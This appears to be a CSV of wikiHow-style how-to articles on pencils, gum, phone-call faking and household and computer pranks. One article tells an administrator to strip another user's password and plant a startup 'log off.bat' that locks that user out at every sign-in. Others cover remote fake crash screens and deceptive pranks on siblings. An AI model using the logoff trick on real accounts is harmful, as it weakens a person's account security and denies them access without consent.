headline,title,text
"
Use sandpaper.,
Use a nail file.,
Rub your pencil against a rough foundational structure.",How to Sharpen Your Pencil at School Without a Sharpener1," You may find yourself in a situation where you don't have any back-up writing tools and simply can't ask to to borrow a pencil. If so, you'll need to get creative. If you are able to find a rough surface on which to rub your pencil tip, you should be able to bring it back to a sharp tip. Sandpaper will work exceptionally well for this.









If you are in shop class, then it shouldn't be too hard to find a piece of sandpaper floating around. Of course, you probably don't have this in your desk or bag, but if you are a habitual pencil-breaker, and if your teacher is notorious for not letting students up out of their desks, then keep a small square in your desk.Simply rub your pencil along the rough side of the sandpaper, taking care to rotate your pencil every few strokes, and you should soon see a sharper tip.;
, You're probably more likely to have a nail file on hand. It's a smart idea to carry an emery board with you or keep one in your desk. You'll be able to smooth out both your nails and any dull pencil tips!









The rough grain on the emery board should work well to sand down the wood on your pencil and shave the graphite to a sharper point. Simply drag the edge of your pencil tip down the nail file, taking care to rotate consistently.
If you carry nail clippers, many have a metal nail file attachment that swings out. It may be rough enough for you to use to sharpen your pencil, as well.

, If your pencil breaks and you're without a sharpener (or nail file or sandpaper), take a look around you: Are you sitting next to a brick wall? Are you on pavement or concrete?









These rough surfaces should work well to help you out of your predicament: you should be able to hone your pencil tip by rubbing it firmly on the pavement, against a brick wall, or even on the mortar in between the bricks.

"
"
Place the pencil under your index and pinky finger, while over your middle and ring finger.,
Release your index finger, bringing the pencil to a vertical position between your ring and pinky finger.

,
Place the thumb behind pencil just under your pinky.

,
Push up and out with thumb, bringing the pencil to a horizontal position.

,
Place your index finger under the pencil.

,
Release your thumb and pinky, bringing the pencil to a vertical position between your index and middle finger.

,
Place your thumb behind the pencil, just under your middle finger.

,
Push up and out with your thumb to bring the pencil to a horizontal position.

,
Slide the pencil off your middle finger, clasping the pencil between your thumb and index finger.

,
Press the bottom of the pencil down with your middle finger, bringing the pencil to a vertical position.

,
Place your index finger on side of the pencil, so the pencil is between your index and middle finger.

,
Place your thumb under the pencil.

,
Push up with your thumb to bring the pencil to a horizontal position.

,
Secure the pencil with your pinky to bring pencil back to the original position.

",How to Twirl a Pencil,";
,,,,,,,,,,,,,"
"
Form the gum into a bubble.,
Fold it into a dumpling shape instead.,
Practice snapping repeatedly.",How to Snap Your Gum2," Flatten the gum into a disk, just like you would in the normal snap method. Stick your tongue through the disk without breaking it, then withdraw your tongue and clamp the edges together to make a a sealed air bubble. Chew to pop this bubble and make a snapping noise.


Blowing into the bubble as you pull out your tongue might help., Some people find it faster to fold the gum in half instead. Bring one end over to the other, sealing the sides and ends with your teeth and the sides of your mouth. If you manage to do this correctly, you'll end up with a ""dumpling"" of air, which pops just like an ordinary bubble.

, If you want to snap gum many times as you chew, you'll have to practice one of the two steps above until you can do it rapidly or even unconsciously. Once you learn these larger motions, you can try making the bubbles smaller and smaller, until you can form them just by folding the gum over and chewing. Chewing too hard or too soft will prevent the bubbles from forming and making noise, so it takes quite a bit of practice before you can get a steady stream of snaps."
"
Buy a phone screen protector.,
Peel away the first one and keep it somewhere safe in your room.,
Scribble on the showing side of the protector, then gently lay it on the phone.",How to Turn Your Sibling's Room Into a Prank Paradise2," If one is already on it, save this one.;
, Now, take some markers from their box. Red and black are very bold colors, so try those.

, This will make it look as though you've ruined their most private and prized possession.

"
"
Take the top sheet and carefully fold it, then re-cover it with the comforter.",How to Turn Your Sibling's Room Into a Prank Paradise3," This is a simple, hilarious prank that people don't mind too much, so use this on your touchier victims.

"
"
Purchase a pair of walkie-talkies.,
When the victim is getting ready for bed, switch them on.",How to Turn Your Sibling's Room Into a Prank Paradise4," They must have volume control, or else come with very loud speakers. Hide one in a place where the victim won't be able to see it, like under the bed, or hung on the inside door knob of the closet if they rarely go in there.

, Wait until you hear then snuggling into their bed (with some frustration, considering that it's short sheeted!), then switch yours onto talk. Take a deep breath, putting stress on the exhale. And another. They will hear suspicious breaths from somewhere in the room... so spooky!!!

"
"
Acquire a doll and tangle her hair.,
Now rip the brush through the doll's hair, causing it to come off onto the brush spikes in tangled chunks.",How to Turn Your Sibling's Room Into a Prank Paradise5," A lot. Make sure that if the victim is blond or brunette or has black hair that you use red doll's hair, and if the victim has red hair, that the doll's hair is blond or black. These are the most noticeable colors- brown hair is a little stealthier.

, When the victim sees the brush, they will feel a little shifty, and maybe even grossed out!

"
"
Use this prank only if you have a dog or a cat.,
Slice up a banana and crush it into the mixture.,
Pet's don't barf so much, remember that!",How to Turn Your Sibling's Room Into a Prank Paradise6," Make some oatmeal, then stir in one or two drops of yellow or green food coloring.

, Use raisins, corn kernels, or ripped pasta for chunks, but I don't advise putting these in if it is supposed to be cat barf.

, Only drop a few spoonfuls in ONE PLACE on the carpet. If you want it to smell icky, garlic sauce and a little old cheese work well.

"
"
Take a glue stick and put a few dabs on the corners of folders, along the rim of unused staples, and random places that will not infuriate but mildly annoy the subject.

,
Tape covers onto books and use double sided tape to stick cups, bowls, table cloths, and paper to desks and table.",How to Turn Your Sibling's Room Into a Prank Paradise7,", This will generally drive the victim up a wall!

"
"
Do this before they enter their room, when they are not in the least suspicious or edgy.,
Later, insist on getting them a drink.,
To those of you that don't know what happens when Mentos mix with coke, it is a huge explosion!",How to Turn Your Sibling's Room Into a Prank Paradise8," Several hours before, fill an ice tray with water, then drop Mento pieces into the puddles. Freeze.

, If they don't except, tell them that you ""just want to spend some time with them over a coke, is that to much to ask?"" When they agree, act excited and hurriedly prepare their drink. ALREADY HAVE YOUR COKE READY. They will be uncertain why you used different ice cubes, so already have your coke prepared.

, Like the effect of when you shake an unopened can, but bigger. It's hilarious!

"
"
The switcheroo prank.",How to Turn Your Sibling's Room Into a Prank Paradise9," Switch all the art and posters on their walls with random posters of artists they dislike and nonsense scribbles. Simple and satisfying.

"
"
Use a knife or scissors.,
Use other sharp edges.,
Twist your pencil through the hole in your ruler.,
Use the edge of your key and/or the keyhole.,
Use a screw.,
Use nail clippers.,
Use your nails and teeth.",How to Sharpen Your Pencil at School Without a Sharpener2," If you have a utility knife, x-acto knife, or pair of scissors available, you should be able to sharpen your pencil with little effort. Simply scrape the edges of your pencil along the sharp edge of any of these tools.









If you use scissors, open them as wide as they'll go. Hold the blade (whether it's the scissors blade or knife blade) firmly in your non-dominant hand, and the pencil in your dominant hand.
The pencil should be at about a 45 degree angle. Pull the pencil down towards you, scraping the wood and graphite against the sharp edge at that 45 degree angle. Rotate the pencil and repeat this motion until you get a good enough point.
DO NOT draw the blade towards you. Instead, hold it steady and move the pencil along it.DO NOT bring a knife or x-acto blade to school with the intention of having it on hand for this purpose. We only suggest using these sorts of blades in the instances when they are readily available and permitted by school policy (perhaps in art class or shop class).

, You most likely aren't allowed to keep a blade or x-acto knife at school, and you may not have scissors. If so, look through the supplies you have for unexpected sharp edges.









For example, the edge of your ruler may be sharp enough to help you out, particularly if you have a metal ruler (even some plastic rulers may work—it doesn't hurt to try).
Hold the ruler firmly in your non-dominant hand and scrape the pencil down along the edge carefully and slowly. Rotate the pencil every couple of strokes, and you should be able to sharpen it up a bit.

, Most rulers have holes so that they can be placed in three-ring binders. If yours does, you may be able to use this hole to push back the wood on your pencil to reveal the graphite below.









Once you've either pushed back the wood (or you may even be able to shave some of it away), you can try to sharpen up the tip by scraping it along the rough edge of the hole or use some of our later advice on how to sharpen just the graphite tip.

, Most metal keys have fairly sharp edges, and they likewise have holes for placing them on key rings. In a pinch, you may be able to repurpose your key as a make-shift pencil sharpener.









If your tip has broken off completely and you can't see any graphite, then start by using the keyhole to push back the wood.
Once you've revealed the graphite, you can gently scrape it along the sharper edge of your key until you are able to write with it again.
Your final result may not be pretty, but it should be sufficient to get you through the rest of your writing or drawing task.

, So you don't have a nail file, scissors, a ruler, or a key! What should you do? Look around your chair and desk to see if you can spot a Philip's head screw (you'll see a cross on the top of the screw instead of a single line).









If you can reach the screw easily, leave it in place and place your pencil tip in the top of the screw. Rotate your pencil clockwise. This should grind down the wood and reveal more graphite.
If you are able to find a loose screw, you can then use the side of the screw to continue to sharpen the pencil. We don't, however, recommend that you try to remove any screws: you don't want to risk collapsing your desk or chair!

, If you keep nail clippers in your pocket or desk, you should be able to use them to help you out of this jamb. We talked above about how you may be able to use the attached nail file. Even if your clippers don't have a file, though, they can still be useful.









Simply make tiny clips all along the tip of your pencil to trim away the wood. This will work best if you hold the pencil horizontally with your non-dominant hand and hold the clippers perpendicularly with your dominant hand. This should line up the cutting edge of the clippers with the wooden tip of the pencil.

, If you're not adverse to using your nails and teeth as tools, you may be able to use them to push back (or carefully nibble away) some of the wood of your pencil. Once you've revealed enough of the graphite to begin working again, consider honing it to a tip using some of our other suggestions.


Be very careful not to swallow any of the wood shavings. You also want to avoid ingesting the graphite—not because it's toxic like old lead pencils were—but just because it's gross! You also don't want to discolor your teeth.

"
"
Lightly sketch lines on piece of paper.,
Rub your pencil on a folder or piece of paper.,
Rub your pencil tip against your shoe.",How to Sharpen Your Pencil at School Without a Sharpener3," If you haven't broken your pencil tip completely and only need to return a dull point to a sharper tip, you may be able to do so by very lightly sketching on a piece of paper.









Your pencil should be nearly flat against the paper: hold it at about a 30 degree angle and sketch thin lines, rotating your pencil every couple of sketches.

, A slight variation to the above technique would be to hold the pencil at the same angle against a piece of paper or folder and gently move your pencil tip back and forth several times to create a rubbing (imagine that you are trying to evenly shade in a small area).









Keep the pencil as flat as possible against the paper, and rotate your pencil frequently. This may shave down some of the graphite so that you get a longer, sharper point.

, If you don't want to mark up your paper or if you don't have a spare folder handy, try rubbing the edge of your dulled pencil tip against the rubber of your shoe sole.









Again, be sure to rotate the pencil and don't push too firmly in order to protect against snapping off the tip or rubbing it down altogether.

"
"
Have back-up pencils.,
Ask to borrow someone's pencil.,
Use a mini-sharpener.,
Switch to a different writing implement.",How to Sharpen Your Pencil at School Without a Sharpener4," If your pencil tip breaks off completely, you may be out of luck and won't be able to restore it to a point. The best way to handle a broken pencil is off course to have spare pencils available.


The smartest strategy for dealing with a broken pencil is to not have to try to sharpen it, and to always carry at least a couple more than you think you will need.

, If you can't get to the pencil sharpener, you may be able to draw upon the pity of a fellow classmate. You may even be able to get someone to offer you a spare pencil without having to talk: simply sigh and hold up the broken tip. With luck, someone near you will notice and will be willing to hand you an extra.


Take care not to make your situation worse, though, by speaking during an exam or important assignment. You don't want to get in even worse trouble or get your friend in hot water by forcing them to talk to you. You'll both risk failing the test or assignment.

, If you have a tendency to break pencils or if you dull the point quickly because you press down firmly when writing or drawing, you can avoid creating problems for yourself by constantly asking to get up and use the sharpener by keeping your own in your desk or pocket.


You can purchase mini sharpeners at any office supply store or big-box store like Target or Walmart. You can also use a make-up sharpener (usually designed to sharpen eye and lip liners).

, So long as you aren't taking a standardized test which requires you to use a pencil, you may be able to switch to a pen or even crayon to complete your work. With luck, your instructor will understand.

"
"
Download a fake call app.Although you might choose to fake the call completely, a ""fake call app"" can be used to call and make your phone ring automatically.,
Set an alarm beforehand.,
Pretend like you got a call.,
Make a fake call yourself.,
Keep a healthy distance from other people.,
Exchange a fake greeting.,
Give your call a purpose.,
Set aside time to listen.,
Change your facial expression periodically.,
Interrupt yourself.,
End the phone conversation.Ending a phone conversation should be done as you would with a regular conversation.,
Consider the potential risks of fake calling.Faking a phone call is usually done for the sake of getting out of a social obligation.,
Say you need to be elsewhere.,
Make yourself busy with something nearby.,
Text instead of call.Generally speaking, texting is a lot easier to fake than a full-fledged phone call.",How to Pretend You Are Talking on the Phone," If you have a smartphone, look into downloading one of these apps. It can give you the initiative you need to get your fake call started.


Fake Call, Fake Call 2, and Fake-A-Call-Free are all examples of apps you can download for this reason.;
, Setting an alarm on your phone will result in it ringing at a given time. If you're able to plan in advance or know you're heading into a situation you'll want to be excused from, set an alarm to go off. When your phone rings, you'll have a reason to ""answer"" and begin your phone conversation from there.


If you're already in an uncomfortable setting, you can pretend to send a text message while you're preparing an alarm.
If you need your phone to ring immediately, set your alarm to go off a minute from now.

, You can always lift a phone to your face without a ring or dial tone. If the area you're in is loud enough, other people around you will simply assume they couldn't hear your phone vibrate in your pocket. This is a good option if you need to fake a call in a hurry ad have no time to prepare in advance.


If you're faking a call, it's a good idea to put your phone on silent. This will cancel out the chance of a real person attempting to call you while you're faking a conversation.

, If you're in a situation where it's acceptable to make phone calls, you won't need to wait for the phone to ring to pick it up and make it happen. Pick up your phone, and pretend to press in some numbers. Bring the phone up to your ear, and wait a few seconds while the person on the other end supposedly picks it up. After that, you may begin your phone conversation.


It's a good idea to press real buttons if someone may be able to hear the tone dial (or lack thereof.) It may be helpful to actually dial up and call a number. When you do, immediately ""hang up"" the call but keep going as if you were about to talk to someone on the other end. With most phones, there is usually the space of a couple of seconds after calling before it goes through to the other line. Make a point of hanging up before this happens. If you do, there's a chance the number you called will attempt to call you back.

, Although the other person talking would be very quiet to other people whose ears aren't up near the receiver, you can still often hear an indistinct chatter if someone's on the phone nearby. Because you obviously won't have this if you're faking a phone call, it's important to keep enough distance from other people that they wouldn't be able to hear the chatter if it was there. With enough space between you and others, they won't be able to suspect there's no sound coming through.


This issue is averted if you're wearing earbuds with your phone, or are in a loud setting.

, Almost all phone calls begin with a simple greeting. Saying something like ""Hello"" or ""Hey, what's up?"" before you start talking on the phone lends a greater sense of authenticity to your phone conversation.

, Although it's not unheard of that people will call each other just to catch up, a faked phone call is easier to accomplish if you know what the conversation's supposed to be about. Give yourself a good idea about the reason for calling, especially if you're the one supposedly initiating the conversation. Even if you spend a lot of the conversation ""listening"", your responses will be more believable if you offer more than generic, one word responses.


A generic idea for a phone call could be making dinner plans for later on that week. A more general call to check up on how someone's doing is also believable.
Proper planning allows for better improvising.

, A phone conversation tends to be two-sided. That means you should spend at least half of your session trying to look like you're listening to someone on the other end. After giving your responses, wait a while and try to imagine what the other person would be saying. This will occupy your mind while you're supposed to be listening, and give you a better idea how to keep the fake chat going.

, When we're talking on the phone with someone, you may be physically reacting to the person on the other line. A fake phone call can appear more believable if your face changes as if you were hearing someone talk. This makes it important to have some idea what your fake conversation is about, as it will give you some indication what your reactions should look like.


Don't change your face too often. There should be one facial reaction per ""response"" on average. It's also important not to overdo your expressions. Don't make it seem like you're putting on a show for whomever's nearby.

, Authentic-sounding conversations will have a degree of unpredictability to them. Some phone calls will have both people talking at once or accidentally interrupting each other. Stopping yourself in mid-sentence makes it sound like there's a real person on the other end talking to you.

, Much like the case with greetings, there are expected, routine ways you are expected to end a chat with someone. Saying ""Goodbye"" or ""Talk to you later"" will signify to both parties (and whomever's watching you make the call) that the call is over. If and when you choose to end the call, make sure you don't have a reason anymore to fake the call. Chances are you won't be able to use it as a tactic again once you've hung up. Picking up the phone again will look suspicious.


If you run out of a reason for faking your phone conversation, you won't need to end the call in any particular way
Remember to make it look like you're ending the call on the phone itself. Press the phone's ""end call"" button and turn it off.

, Although it can be a useful tool, there's a risk of being found out and having your efforts backfire. With that in mind, it may be a good idea to consider other options first.

, If you're trying to get out of a conversation, for example, you might say tell the person you're talking to that you have somewhere you need to be. This may be done with or without the help of a phone. If you want to look like you're ""on the go,"" keep your phone at hand. This will make it look like you're already doing something or expecting someone to call.

, If you're trying to look busy or occupied, there are probably lots of things around you that you could focus yourself around. Cleaning or starting a real-life conversation with someone are good ways to get busy quickly. If it looks like you're doing something, you'll be able to excuse yourself from the situation without giving a reason to whomever's around.

, Fake texting (or merely browsing on your phone) is a more common way of looking busy, and it can alleviate awkwardness. Just make sure no one can see your phone screen. If they do, they'll be able to tell you're faking it.


Texting isn't as effective at getting you out of situations, as it's often quick and non-committal. If you need to get out of a situation fast, you should go straight to a call.

"
"
Gather the needed materials.,
If the person has an answering machine, disconnect it from the line.,
Get the tape recorder set up as close as possible, to the phone you are pulling the prank with.

,
Start the recording.,
Wait a few seconds, then dial the phone number on the cellphone away from the tape recorder, so the recorder won't pick up the cellphone sounds.

,
When the phone rings let it ring endlessly for as long as possible.,
When done recording, hide the tape recorder near the phone.,
Time to set up the extension cords.,
When the victim is around hide somewhere with the cords and when they do a certain thing plug the two cords into each other by sticking the one end in the other.,
Repeat the last two steps many times.",How to Pull the Phantom Telephone Prank," Get out a tape recorder with a microphone on it and get an empty cassette tape. Also, you will need a cellphone to dial the person's home phone number.;
, Connect the phone back up.

,, (Be very quiet so your noises won't be on the recording)

,, Make sure the answering machine is disconnected. The recorder will pick up the rings and record them.

, Hide it as close to the phone as possible.

, You will plug one into the power supply for the tape recorder. Make sure the play button is pressed down.


Run extension cords around the room and out where the victim won't see them.
Run one out to an outlet in a different room or take the one extension cord plugged into the recorder and take another extension cord and plug it into an outlet in the room of the recorder.

,


When plugged in the tape will play the ringing and make the victim think the telephone is ringing.
As soon as they get within 5 feet (1.5 m) of the phone disconnect the cords so the ringing stops!
When they leave and turn their back on the phone and they're about to do something else set off the phantom phone again.
Disconnect power again when they're 5 feet (1.5 m) within the phone.

, The phantom phone prank will drive them crazy!

"
"
Monitor their bedtime routine.,
Keep your eyes on them.,
Listen for clues.,
Be patient.,
Wear quiet clothing.,
Keep your body from giving you away.,
Control your breathing.,
Plan your path.,
Prepare your eyes for darkness.,
Walk silently by rolling your feet.,
Freeze if they move or are facing you.,
Hide in the shadows.",How to Sneak Up on Someone When They're Sleeping," If you are sneaking up on someone in your family, or a person you live with, it is likely that you know their bedtime routine. Most people learn a bedtime routine at a very young age. It may change slightly over time, but most people have certain things they do before they go to sleep.A bedtime routine can involve things like brushing teeth, grabbing a glass of water, taking a bath or reading a book.
Pay close attention for a few nights to learn the routine of the person you want to sneak up on.;
, Beyond their routine, the person’s body can give them away. Watch for cues that they are getting sleepy. If they are yawning, rubbing their eyes, or beginning to nod off, you know that they will be sleeping soon.


They may even doze off right in front of you, making sneaking up on them really easy.

, If they have gone to bed and closed the door, listen closely for clues that they are sleeping. Beyond that, you also want to listen for warnings that they may still be awake. Stay close and listen carefully to figure out what they are doing.


You may hear them turn the television off, switch off the light, or start snoring.
You could hear the bed springs squeak if they are rolling around, they may cough or get up to go to the bathroom

, Don’t act too early. In fact, just when you think the person is asleep, wait a little while longer. You are more likely to wake someone who is in the first or second stage of sleep, than when they reach a deeper sleep. Give yourself and the other person a few extra minutes to fall deeper into sleep before you pounce., Some items of clothing can make noise when you walk. Avoid wearing something that is going to give you away. A good choice of clothing would be some flannel sleeping pants, a cotton t-shirt and some socks to keep your steps quiet.


Steer clear of things like wind pants that swish at the thighs, tennis shoes which could squeak on wood floors, and even jeans may pop in the crotch area.

, Don’t let a cough or a sneeze sneak up on you when you are trying to sneak up on someone else. Do everything you can to avoid coughing or sneezing, and suppress these urges if you feel them coming on.


Wet your throat by drinking a glass of water before you begin your mission. Try sucking on a cough drop while you sneak around.Blow your nose before you start to keep anything in there from making you sneezy. If you do feel a sneeze coming, plug your nostrils, then pull to stretch your nose., You may feel compelled to hold you breath, but the volume of air in your lungs will cause your body to react. You are required to exhale and if you need air, your lungs will eventually gasp for it. Instead, take slow, controlled breaths.


Breathe in slowly through your mouth for eight counts, then exhale through your mouth for eight counts to keep your breathing slow, even and quiet.

, Avoid creaks and squeaks. Creaky floors and squeaky doors could wake the person up and give you away. Walk around the house in advance and learn what parts of the floor creak and which doors squeak when you open them, then avoid those areas or fix the noise.


Stairs tend to be especially creaky because they have so many pieces of wood put together to make the staircase.If there is a staircase between you and the person you are sneaking up on, make sure you cross the stairs before they fall asleep.
Walk through open doors, or put some petroleum jelly on the hinges before you have to open them sneakily., You don’t want to have to turn on any lights. It is important to adjust your eyes to the darkness, so you can navigate your path to the sleeping person. Give your eyes time to adjust to the darkness so you don’t bump into anything on your way.Wait in the dark for ten minutes to allow cones of your eyes to adjust to the darkness.

, A flat foot makes more noise. To get really close to someone without waking them, step forward and set down your heel first. Roll along the outside of your foot from your heel to your pinky toe.Put your foot firmly down before you put weight on it.
Stay balanced. Don’t pick up your other foot until your weight is firmly balanced on your planted foot.
Keep it slow. It should take a full 20 seconds to complete three steps.

, They may hear you or detect that there is someone else in the room. If the are already facing you or you hear them rolling around, stop moving and try to blend into the dark.You may have to stay frozen for several minutes while you wait for them to settle back into sleep.

, No matter how dark the room is, there is probably still a little ambient light coming from the moon or street lights. The thing that will really give you away is your silhouette. People may look around if they suspect your presence, but they will look around at eye level.


Stay low to the ground and hide behind objects to avoid being visible.

"
"
Get an empty plastic water bottle, preferably an Ozarka water bottle, or around that size (preferably the cheapest bottle there is).,
Twist the bottle in the center or at the top of the bottom third of the bottle.

,
Once you have twisted it as far as you can, carefully twist the cap loose, but not fully, and, holding the bottle securely, slide the cap around slowly with one finger until it pops off loudly.",How to Pop a Water Bottle Manually1," Go to your local grocery store and pick up some store-brand bottled water, those usually work well. The reason for this is bottles from Aquafina, Dasani, and other name brands have thicker plastic, making Step 2 harder.;
,,


Often, the bottle will emit white vapor, caused by the water droplets inside the bottle evaporating from the quick pressure change. It is not dangerous to sniff it, if one is so inclined.







"
"
Download and install BlueScreen Screen Saver v3.2 By Mark Russinovich.,
Prank your school, library or coworkers with this C++ program that simulates a BSoD.,
Compile your own prank program using the ""Remote BSoD Invocator"" (or simply RBSoD), as a template.,
Prank your Mac OS-X friends.,
Use these dashboard widgets to simulate a Kernel Panic or BSoD.

,
Fake a funny Kernel Panic with ""Popcorn Kernel"" that has a smiley face, and text telling the prankee ""Don't freak out.,
Build your own remote device that triggers a fake BSoD.",How to Pull a Prank on Windows," This screensaver shows actual system information, and you can choose to have it mimic hard drive activity. It also scrolls through different blue screens and simulated boots every 15 seconds or so, making it very realistic. And, it's from Microsoft. Just download the zip file and extract ""sysinternals.scr into your Windows\System32 directory, then choose it as the active screensaver.;
, Just open up BSoD Prank 1.0(BSoD.exe), then press Alt+Enter to initiate and Esc to end.

, RBSoD lets you choose a url to BSoD, as well as letting you choose between numerous error messages or, create your own message.

, The ""Kernel Panic"" may not be seen as often as the BSoD, but it is a part of a Mac users life regardless of what Apple wants you to think. KPSaver is a neat little screen saver prank developed by Doomlaser that simulates the dreaded ""Kernel Panic"", the equivalent of a Windows BSoD.

,, This isn't really a Kernel Panic. You've been pranked. Just click the smiley face, and all will be fine.""

, The BSoDomizer is a device that interfaces between a computer and it's VGA monitor, and allows the pranker to trigger it via infrared remote control. View a video of the BSoDomizer being tested here

"
"
Find a suitable plastic water bottle.,
Step on the bottle.

,
Open the bottle cap slightly.",How to Pop a Water Bottle Manually2," Empty it of water and securely close the cap.

,, Watch it fly away.

"
"
Make sure you're an admin (or have admin rights), or else if the victim has a password that you don't know, you can't do this.,
If the victim has a password and you are an administrator, go to the start menu and click ""Control Panel"".,
Log off your account and log on to the victim's account.

,
Open their start menu, click ""All Programs"", and scroll down to ""Start up"".

,
Right-click on start up and click open.

,
Right-click anywhere in the window that opens except on a file or folder.

,
Under ""New"", click ""Text Document"".

,
Name it ""log off.bat"", being sure to have the .bat extension rather than .txt.

,
Right-click on your new file and click ""edit"".

,
On the first line, if you are running Vista, type without quotes, ""cd c:\users\<ACCNAME>"", replacing <ACCNAME>with your victim's user account name.,
For the second line on either operating system, type, without quotes, ""log off"".

,
Save the file.,
To change it back on Windows Vista, on your user account, go to the start menu and click computer.,
Alternatively, to change it back, restart Windows and start up in safe mode.",How to Pull a Computer Logoff Prank," Also, at least on Windows Vista (not sure about XP), you can't change it back if you are not an admin.;
, On the left, click ""Classic View"". Then click ""User Accounts"". Click on ""Manage Another Account"" and then choose your victim's user account. Click on ""remove password"". Click on ""remove password"" and then exit out of the program.

,,,,,,,,


If you are running Windows XP, the first line should be, without quotes, ""cd c:\documents and settings\<ACCNAME>"", again replacing <ACCNAME>with your victim's user account name.

,, Make sure it is saved with a .bat extension and not .txt.


Every time your victim tries to log on, it will immediately log off!

, In the address bar, type without quotes, “c:\users\<ACCNAME>\appdata\roaming\microsoft\windows\start menu\programs\startup”, replacing <ACCNAME>for the former victim’s user account name, and then press enter. Delete the log off.bat file you just created. On Windows XP, use the same path, except instead of using “c:\users\...”, use “c:\documents and settings\...”.

, On Vista you can do this by unplugging your computer and plugging it back in, then choosing “Start Windows in Safe Mode” from the menu that appears. On XP, when the progress bar appears and says “Starting Windows”, press F8 and then choose safe mode. When in safe mode, log on to your former victim’s account and follow steps 3-5 to get into their start up folder. Delete the log off.bat file.

"
"
Gather the ingredients.,
Mix the ingredients.,
Find the right person.",How to Make Fake Gatorade for Pranks," You will need: An empty Gatorade bottle, water, and lots of different food colouring.;
, It is best to have an already used Gatorade bottle, and the wrapper is essential to the prank going well. Pour the water into the bottle. If you are making ""Lemon-Lime"" Gatorade, make sure you are using that kind of bottle and wrapper. Add food colouring until it looks just right. Close the lid, shake it up, and make sure it is thoroughly mixed together.

, Don't choose your school's Albert Einstein to pull this on. Someone not stupid, just your average kid. Say, ""Hey, I got a Gatorade in the vending machine, and I punched in the wrong number. I don't like this flavour."" . If the kid says yes, watch as he/she realizes, it tastes NOTHING like it. If you don't like the results, try again on another kid (just be sure to wash the bottle out)

"
"
Lay the pouch straw end pointed behind you.,
Jump up and drive the heel down on the bottom half of the caprisun.,
This method is the most safest if you want to keep your hearing, and to scare people behind you.

",How to Stomp a Caprisun1," The hole is pointed behind you you. Not in front of you. It should be on its silver side.;
, (Opposite side of the hole with the clear bottom)

,"
"
Make certain the computer is on and running properly.,
Open the window that you would like to make remain on the screen but not be responsive.,
On the keyboard, press ""Print Scr"".,
Open up a picture editing program, such as MS Paint.,
Save the picture somewhere on the computer other than the desktop.

,
Right click on the background of the desktop.,
Click ""Personalize"".

,
At the bottom of the window, click ""Desktop Background"".

,
Near the top of the window, click ""Browse"".

,
Find the saved picture you created, and open it into the list of options.

,
Select the picture you created, and ensure that the ""Picture Position"" is ""Fill"".

,
You're done!",How to Make a Computer Desktop Appear Unresponsive,";
, Once the window is where you would like it on the screen, move your mouse to the upper right corner of the computer screen, making it invisible.

, This will take a picture of the screen.

, Press ""Ctrl + V"" to paste the picture into the program.

,, This will open an options pane.

,,,,,, Now, the window should be in the background of the picture, and everything should line up right.

"
"
In this method, blow up the pouch and remove the straw.,
With all strength, jump up and stomp on the pouch with your whole foot.,
Do it perfectly and you should get a really loud sonic boom sound.",How to Stomp a Caprisun2," You must lay the caprisun on the silver side. The straw is now pointed in front of you not at your face or to the side. Upon curiosity, you might tap the pouch with your entire foot. And as you can see, your toe end of the shoe traps the air in.

, Your heel should be about 1-2 inches over the edge of the bottom side of the caprisun (clear bottom side). Your toes should be trapping the air from the hole where the straw goes.

, If you super stomped it, then the caprisun will blow so hard, that it either splits the pouch bottom into sectional strips or split right down the middle of the back side. (Side on the floor)

"
"Front side is side with design

,
Back is the side always laid down on.,Bottom side is the side with the clear plastic

",How to Stomp a Caprisun3,", The silver side.

,"
